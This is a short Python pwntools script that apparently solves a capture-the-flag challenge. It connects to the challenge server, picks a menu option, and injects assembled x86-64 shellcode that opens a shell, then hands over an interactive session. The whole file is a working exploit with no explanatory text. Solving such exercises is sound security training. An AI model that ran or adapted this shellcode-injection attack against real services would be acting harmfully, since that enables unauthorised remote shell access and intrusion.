#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13424

context.update(arch= 'amd64', os='linux')

def make_payload():
    #get assembly to open a shell
    shellcode = shellcraft.sh()

    #assemble it into bytes
    shellcode_b = asm(shellcode)

    payload = shellcode_b

    return payload

def main():

    io = remote(HOST, PORT)
    io.recvuntil(b'Choose an option: \n')
    io.sendline(b'4')

    payload = make_payload()
    io.recvuntil(b'Enter the size of your shellcode: \n')
    
    io.sendline(str(len(payload)).encode())

    io.recvuntil(b'Enter your shellcode: ')
    io.sendline(payload)

    io.interactive()

if __name__ == '__main__':
    main()
